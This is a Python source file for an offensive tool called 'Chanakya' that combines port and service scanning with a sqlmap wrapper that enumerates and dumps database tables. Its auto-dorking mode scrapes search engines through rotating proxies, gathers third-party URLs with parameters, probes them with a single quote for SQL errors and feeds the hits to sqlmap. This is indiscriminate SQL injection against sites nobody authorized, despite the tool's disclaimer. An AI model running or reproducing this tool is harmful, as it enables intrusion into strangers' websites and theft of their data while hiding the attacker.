#v2.1.4

import nmap
import os
import socket
import logging
import requests
from bs4 import BeautifulSoup
from datetime import datetime
import urllib.parse
import traceback
import time
import random
import subprocess
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Define color variables
RED = "\033[91m"
GREEN = "\033[92m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"
YELLOW = "\033[93m"
WHITE = "\033[97m"
RESET = "\033[0m"

# Setup logging
logging.basicConfig(filename="scanner.log", level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Headers and IP rotation_common user-agents from different OSes and browsers (as of 2025)
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
]

def fetch_and_save_valid_proxies():
    print(GREEN + "[*] Fetching fresh HTTP proxies..." + RESET)
    proxies = get_valid_proxies()
    if proxies:
        print(GREEN + f"[+] {len(proxies)} valid proxies saved to valid_proxies.txt" + RESET)
    else:
        print(RED + "[!] No valid proxies found." + RESET)


def test_proxy(proxy):
    try:
        test_url = "https://httpbin.org/ip"
        res = requests.get(test_url, proxies={"http": proxy, "https": proxy}, timeout=5, verify=False)
        return res.status_code == 200
    except:
        return False


from concurrent.futures import ThreadPoolExecutor
HTTP_PROXY_LIST_URL = "https://proxyspace.pro/http.txt"

def get_valid_proxies(limit=150):
    try:
        print(CYAN + "[*] Fetching HTTP proxy list..." + RESET)
        response = requests.get(HTTP_PROXY_LIST_URL, timeout=10)
        raw = response.text.strip().split('\n')
        candidates = ["http://" + p.strip() for p in raw if p.strip()][:limit]
    except Exception as e:
        print(RED + f"[!] Failed to fetch proxy list: {e}" + RESET)
        return []

    print(CYAN + f"[*] Validating up to {len(candidates)} proxies..." + RESET)
    valid = []
    with ThreadPoolExecutor(max_workers=20) as exe:
        futures = {exe.submit(test_proxy, proxy): proxy for proxy in candidates}
        for future in futures:
            proxy = futures[future]
            if future.result():
                valid.append(proxy)

    if valid:
        with open("valid_proxies.txt", "w") as f:
            for p in valid:
                f.write(p + "\n")
        print(GREEN + f"[+] {len(valid)} valid proxies saved to valid_proxies.txt" + RESET)
    else:
        print(RED + "[!] No valid proxies found after validation." + RESET)

    return valid


def load_proxies_from_file():
    try:
        with open("valid_proxies.txt", "r") as f:
            proxies = [line.strip() for line in f if line.strip()]
            print(CYAN + f"[*] Loaded {len(proxies)} valid proxies from file." + RESET)
            return proxies
    except FileNotFoundError:
        print(YELLOW + "[!] Proxy file not found. Fetch new proxies from the menu." + RESET)
        return []

PROXIES = load_proxies_from_file()


def get_random_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive"
    }

def get_random_proxy():
    try:
        with open("valid_proxies.txt", "r") as f:
            proxies = [line.strip() for line in f if line.strip()]
        if proxies:
            proxy = random.choice(proxies)
            return {"http": proxy, "https": proxy}
        else:
            print(YELLOW + "[!] No proxies available in valid_proxies.txt." + RESET)
            return None
    except FileNotFoundError:
        print(RED + "[!] valid_proxies.txt not found. Please fetch proxies first." + RESET)
        return None


def try_bing_request(dork, use_proxies=True, retries=3):
    headers = get_random_headers()
    url = f"https://www.bing.com/search?q={urllib.parse.quote(dork)}"

    for attempt in range(1, retries + 1):
        proxy = get_random_proxy() if use_proxies else None
        proxies = proxy if proxy else {}

        try:
            print(YELLOW + f"[*] Trying Bing (attempt {attempt}/{retries})..." + RESET)
            response = requests.get(url, headers=headers, proxies=proxies, timeout=10, verify=False)
            if response.status_code == 200:
                return BeautifulSoup(response.text, "html.parser")
        except Exception as e:
            print(RED + f"[!] Bing request failed: {e}" + RESET)
            if not use_proxies:
                break
    return None


def try_google_request(dork, use_proxies=True, retries=3):
    headers = get_random_headers()
    url = f"https://www.google.com/search?q={urllib.parse.quote(dork)}"

    for attempt in range(1, retries + 1):
        proxy = get_random_proxy() if use_proxies else None
        proxies = proxy if proxy else {}

        try:
            print(YELLOW + f"[*] Trying Google (attempt {attempt}/{retries})..." + RESET)
            response = requests.get(url, headers=headers, proxies=proxies, timeout=10, verify=False)
            if response.status_code == 200:
                return BeautifulSoup(response.text, "html.parser")
        except Exception as e:
            print(RED + f"[!] Google request failed: {e}" + RESET)
            if not use_proxies:
                break
    return None


def try_yahoo_request(dork, use_proxies=True, retries=3):
    headers = get_random_headers()
    url = f"https://search.yahoo.com/search?p={urllib.parse.quote(dork)}"

    for attempt in range(1, retries + 1):
        proxy = get_random_proxy() if use_proxies else None
        proxies = proxy if proxy else {}

        try:
            print(YELLOW + f"[*] Trying Yahoo (attempt {attempt}/{retries})..." + RESET)
            response = requests.get(url, headers=headers, proxies=proxies, timeout=10, verify=False)
            if response.status_code == 200:
                return BeautifulSoup(response.text, "html.parser")
        except Exception as e:
            print(RED + f"[!] Yahoo request failed: {e}" + RESET)
            if not use_proxies:
                break
    return None


def try_duckduckgo_request(dork, use_proxies=True, retries=3):
    headers = get_random_headers()

    if use_proxies:
        for attempt in range(1, retries + 1):
            proxy = get_random_proxy()
            proxies = proxy if proxy else {}

            try:
                print(YELLOW + f"[*] Trying DuckDuckGo with proxy (attempt {attempt}/{retries})..." + RESET)
                response = requests.post(
                    "https://html.duckduckgo.com/html/",
                    headers=headers,
                    data={"q": dork},
                    proxies=proxies,
                    timeout=10,
                    verify=False
                )
                if response.status_code == 200:
                    return BeautifulSoup(response.text, 'html.parser')
            except Exception as e:
                print(RED + f"[!] Proxy failed (attempt {attempt}/{retries}): {e}" + RESET)

        print(YELLOW + "[*] All proxies failed. Retrying without proxy..." + RESET)

    # Fallback (or direct if proxies disabled)
    try:
        response = requests.post(
            "https://html.duckduckgo.com/html/",
            headers=headers,
            data={"q": dork},
            timeout=10,
            verify=False
        )
        if response.status_code == 200:
            return BeautifulSoup(response.text, 'html.parser')
    except Exception as e:
        print(RED + f"[!] DuckDuckGo request failed: {e}" + RESET)

    return None



DORKED_HISTORY_FILE = "scanned_dork_links.txt"

def load_dorked_history():
    try:
        with open(DORKED_HISTORY_FILE, "r") as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()

def save_dorked_history(urls):
    with open(DORKED_HISTORY_FILE, "a") as f:
        for url in urls:
            if url.strip():
                f.write(url.strip() + "\n")

# Rotating captions (1 per run)
captions = [
    "Recon. Exploit. Dominate. #ChanakyaMindset",
    "Be the strategist, not the pawn.",
    "Where security meets ancient intelligence.",
    "One step ahead — the Chanakya way.",
    "Every system has a weakness — know it before others do."
]
caption = random.choice(captions)

# UI Title Banner
title = f"""
{RED}
       ██████ ██   ██  █████  ███    ██  █████  ██   ██ ██    ██  █████  
      ██      ██   ██ ██   ██ ████   ██ ██   ██ ██  ██   ██  ██  ██   ██ 
      ██      ███████ ███████ ██ ██  ██ ███████ █████     ████   ███████ 
      ██      ██   ██ ██   ██ ██  ██ ██ ██   ██ ██  ██     ██    ██   ██ 
       ██████ ██   ██ ██   ██ ██   ████ ██   ██ ██   ██    ██    ██   ██ 
{RESET}

{CYAN}{'“Know your enemy before the battle.” – Chanakya'.center(80)}{RESET}
{YELLOW}{caption.center(80)}{RESET}

{MAGENTA}{'Made with ♥ by VirusZzWarning'.center(80)}{RESET}
{MAGENTA}{'⚔️  Follow me on Twitter: @hrisikesh_pal'.center(80)}{RESET}


{RED}{'[!] WARNING: This tool is intended for educational and authorized testing only,'.center(80)}{RESET}
{RED}{'Use it only on systems you own or have explicit permission to test.'.center(80)}{RESET}

"""

# Divider bar
divider = f"{CYAN}{'-' * 80}{RESET}"

def header():
    print(divider)
    print(RED + title + RESET)
    print(divider)

header()

def scan_ports(ip):
    nm = nmap.PortScanner()
    print(GREEN + "[*] Scanning ports on " + ip + RESET)
    try:
        nm.scan(ip)
        now = datetime.now().strftime("%Y-%m-%d_%H-%M")
        with open(f"{now}_port_scan.txt", "w") as f:
            for host in nm.all_hosts():
                host_info = f"Host: {host} ({nm[host].hostname()})\nState: {nm[host].state()}\n"
                print(GREEN + host_info + RESET)
                f.write(host_info)
                for proto in nm[host].all_protocols():
                    f.write(f"Protocol: {proto}\n")
                    ports = nm[host][proto].keys()
                    for port in sorted(ports):
                        state = nm[host][proto][port]['state']
                        line = f"Port: {port} State: {state}\n"
                        print((GREEN if state == 'open' else RED) + line + RESET)
                        f.write(line)
        logging.info(f"Port scan completed for {ip}")
    except Exception as e:
        logging.error(traceback.format_exc())
        print(RED + "[!] Error while scanning ports." + RESET)

def scan_services(ip):
    print(GREEN + "[*] Scanning services on " + ip + RESET)
    now = datetime.now().strftime("%Y-%m-%d_%H-%M")
    try:
        with open(f"{now}_service_scan.txt", "w") as f:
            for port in range(1, 65536):
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                result = sock.connect_ex((ip, port))
                if result == 0:
                    try:
                        service = socket.getservbyport(port)
                    except:
                        service = "unknown"
                    line = f"Port: {port} Service: {service}\n"
                    print(GREEN + line + RESET)
                    f.write(line)
                sock.close()
        logging.info(f"Service scan completed for {ip}")
    except Exception as e:
        logging.error(traceback.format_exc())
        print(RED + "[!] Error while scanning services." + RESET)

scanned_urls = set()

def run_sqlmap_command(args):
    try:
        process = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        for line in process.stdout:
            print(line.strip())
    except KeyboardInterrupt:
        print(RED + "\n[!] Operation interrupted by user." + RESET)
    except Exception as e:
        logging.error("SQLmap error: %s", traceback.format_exc())
        print(RED + "[!] Error during sqlmap operation." + RESET)

def sql_injection_advanced(url):
    print(GREEN + f"[*] Testing for SQL injection: {url}" + RESET)

    if url in scanned_urls:
        print(YELLOW + "[!] Already tested this URL. Skipping..." + RESET)
        return
    scanned_urls.add(url)

    print(CYAN + "[?] Enter custom SQLmap parameters or press Enter to use defaults" + RESET)
    print(YELLOW + "Examples:" + RESET)
    print("  --cookie=SESSIONID=abc123")
    print("  --headers='X-Forwarded-For: 127.0.0.1\nUser-Agent: CustomAgent'")
    print("  --level=5 --risk=3 --technique=BEUSTQ")
    extra = input(GREEN + "Parameters > " + RESET)

    cmd = ["sqlmap", "-u", url, "--batch"]
    if extra:
        cmd += extra.strip().split()
    else:
        cmd += ["--level=2", "--risk=1", "--random-agent", "--threads=4"]

    run_sqlmap_command(cmd)

    follow_up = input(CYAN + "[?] Do you want to enumerate databases? (yes/no): " + RESET)
    if follow_up.lower() == "yes":
        run_sqlmap_command(cmd + ["--dbs"])
        dbname = input(CYAN + "[?] Enter a database name to enumerate tables: " + RESET)
        run_sqlmap_command(cmd + ["-D", dbname, "--tables"])
        table = input(CYAN + "[?] Enter table name to enumerate columns: " + RESET)
        run_sqlmap_command(cmd + ["-D", dbname, "-T", table, "--columns"])
        dump = input(CYAN + "[?] Do you want to dump data from this table? (yes/no): " + RESET)
        if dump.lower() == "yes":
            run_sqlmap_command(cmd + ["-D", dbname, "-T", table, "--dump"])


def choose_search_engine():
    print(CYAN + "[?] Choose a search engine for dorking:" + RESET)
    print("1. DuckDuckGo")
    print("2. Bing")
    print("3. Google (less reliable, may block)")
    print("4. Yahoo")
    choice = input(GREEN + "> " + RESET)

    engines = {
        "1": "duckduckgo",
        "2": "bing",
        "3": "google",
        "4": "yahoo"
    }
    return engines.get(choice, "duckduckgo")



def auto_dorking():
    engine = choose_search_engine()
    use_proxies = input(CYAN + "[?] Do you want to use proxies while dorking? (yes/no): " + RESET).lower().startswith("y")

    try:
        with open("dorks.txt", "r") as f:
            raw_dorks = [line.strip() for line in f if line.strip() and not line.startswith("#")]
    except FileNotFoundError:
        print(RED + "[!] dorks.txt file not found. Please make sure it's in the tool directory." + RESET)
        return

    dorks = [f"inurl:{d}" if not d.lower().startswith("inurl:") else d for d in raw_dorks]

    found_urls = []
    scanned_history = load_dorked_history()
    new_links = set()

    for dork in dorks:
        print(CYAN + f"[*] Searching dork: {dork}" + RESET)
        if engine == "duckduckgo":
            soup = try_duckduckgo_request(dork, use_proxies=use_proxies)
        elif engine == "bing":
            soup = try_bing_request(dork, use_proxies=use_proxies)
        elif engine == "google":
            soup = try_google_request(dork, use_proxies=use_proxies)
        elif engine == "yahoo":
            soup = try_yahoo_request(dork, use_proxies=use_proxies)
        else:
            print(RED + "[!] Unknown search engine. Skipping..." + RESET)
            continue


        if not soup:
            print(RED + f"[!] Skipping dork due to repeated failure: {dork}" + RESET)
            continue

        urls = set()

        if engine == "duckduckgo":
            results = soup.find_all("a", class_="result__a")
            for link in results:
                url = link.get("href")
                if url:
                    urls.add(url)

        elif engine == "bing":
            for a in soup.select("li.b_algo h2 a"):
                href = a.get("href")
                if href:
                    urls.add(href)

        elif engine == "google":
            for a in soup.select("div.yuRUbf > a"):
                href = a.get("href")
                if href:
                    urls.add(href)

        elif engine == "yahoo":
            for a in soup.select("h3.title > a"):
                href = a.get("href")
                if href:
                    urls.add(href)

        for url in urls:
            if "=" in url and url not in scanned_history:
                print(GREEN + f"[+] Found new: {url}" + RESET)
                found_urls.append(url)
                new_links.add(url)

            if url and "=" in url and url not in scanned_history:
                print(GREEN + f"[+] Found new: {url}" + RESET)
                found_urls.append(url)
                new_links.add(url)

        time.sleep(random.uniform(2, 5))

    vuln_sites = []
    for url in found_urls:
        try:
            test_url = url + "'"
            r = requests.get(test_url, headers=get_random_headers(), timeout=5, verify=False)
            if any(x in r.text.lower() for x in ["sql syntax", "mysql", "error in your sql", "warning"]):
                print(GREEN + f"[!!!] Vulnerable: {url}" + RESET)
                vuln_sites.append(url)
        except:
            continue

    if new_links:
        save_dorked_history(new_links)

    if vuln_sites:
        now = datetime.now().strftime("%Y-%m-%d_%H-%M")
        filename = f"{now}_vuln_sites.txt"
        with open(filename, 'w') as f:
            for site in vuln_sites:
                f.write(site + '\n')
        print(GREEN + f"[*] Saved vulnerable sites to {filename}" + RESET)

        print(CYAN + "[?] Do you want to test any site with sqlmap? (yes/no)" + RESET)
        choice = input("> ")
        if choice.lower() == "yes":
            for idx, site in enumerate(vuln_sites):
                print(f"{idx+1}. {site}")
            sel = input("Enter the number of the URL to test: ")
            try:
                sel_idx = int(sel) - 1
                if 0 <= sel_idx < len(vuln_sites):
                    sql_injection_advanced(vuln_sites[sel_idx])
            except:
                print(RED + "[!] Invalid selection." + RESET)
    else:
        print(YELLOW + "[*] No new vulnerable sites found." + RESET)



def main():
    while True:
        print(CYAN + "[+] Recon, Exploit, or Exit? Choose wisely:" + RESET)
        print("1. Port scanning")
        print("2. Service scanning")
        print("3. SQL injection testing")
        print("4. Auto Dorking + SQLi Enumeration")
        print("5. Fetch & Save Valid Proxies")
        print("6. Exit the program")
        option = input(GREEN + "> " + RESET)

        if option == "1":
            ip = input(CYAN + "[*] Enter the IP or domain to scan: " + RESET)
            scan_ports(ip)
        elif option == "2":
            ip = input(CYAN + "[*] Enter the IP or domain to scan: " + RESET)
            scan_services(ip)
        elif option == "3":
            url = input(CYAN + "[*] Enter the URL to perform SQL injection testing: " + RESET)
            sql_injection_advanced(url)
        elif option == "4":
            auto_dorking()
        elif option == "5":
            fetch_and_save_valid_proxies()
        elif option == "6":
            print(RED + "[*] Exiting the program..." + RESET)
            print(YELLOW + "[♥] Made with ♥ by VirusZzWarning" + RESET)
            print(GREEN + "[+] Happy hacking ;)" + RESET)
            exit()
        else:
            print(RED + "[!] Invalid option." + RESET)

        input("\nPress Enter to continue...")
        os.system("clear")
        header()

if __name__ == "__main__":
    main()
